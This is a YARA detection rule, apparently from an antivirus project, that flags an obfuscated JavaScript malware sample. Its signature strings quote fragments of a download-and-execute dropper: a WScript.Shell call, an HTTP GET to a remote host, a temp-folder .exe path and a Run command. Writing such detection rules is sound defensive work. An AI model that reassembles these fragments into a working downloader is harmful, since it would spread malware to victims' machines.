rule sig_20160401_7383f7a0706f33c4aa63da2027d89965 {
  meta:
    description = "datamaliciousorder - file 20160401_7383f7a0706f33c4aa63da2027d89965.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1aff1de37164bd987e6927755d6d125dcfd4a4b66b6c5d04be875ca87275f135"

  strings:
    $s1  = "var OhMv = function UjBtq() {return WScript[OwcHlx](\"WScript\"+\".Shell\");}(), TkKot = 11;" fullword ascii
    $s2  = "if (HpvKvj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s3  = "HpvKvj[MuIgt](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "function TfGwx(){return WsVa + \"\";};" fullword ascii
    $s5  = "function SiUj() {return OhMv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"rI2qgtJmXWnJRSax.ex\" + \"e\";};" fullword ascii
    $s6  = "function WwJad(CabFu, XxUcs){KrrWuj = KrrWuj * 1; return CabFu - XxUcs;};" fullword ascii
    $s7  = "function KthMkn() {return ((ZwpGh == true) && (ZwpGh == GylMd)) ? 1 : KrrWuj;};" fullword ascii
    $s8  = "return WwJad(OynWsw, TqnKbb);" fullword ascii
    $s9  = "function WrFzc(){return 23;};" fullword ascii
    $s10 = "function AeOu(){return OwcHlx;};" fullword ascii
    $s11 = "}while (ToWi);" fullword ascii
    $s12 = "function DnaWb()" fullword ascii
    $s13 = "function OuJrw(YfVry) {var RwWj = (1, 2, 3, 4, 5, YfVry); return RwWj;};" fullword ascii
    $s14 = "var GylMd = false;" fullword ascii
    $s15 = "var ZwpGh = false;" fullword ascii
    $s16 = "function MgdPif(BjYc){OhMv[\"R\"+\"un\"](BjYc, KrrWuj, KrrWuj);};" fullword ascii
    $s17 = "var OgUne = new this[\"Date\"]();" fullword ascii
    $s18 = "GylMd = true; " fullword ascii
    $s19 = "ZwpGh = true; " fullword ascii
    $s20 = "var AePcr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}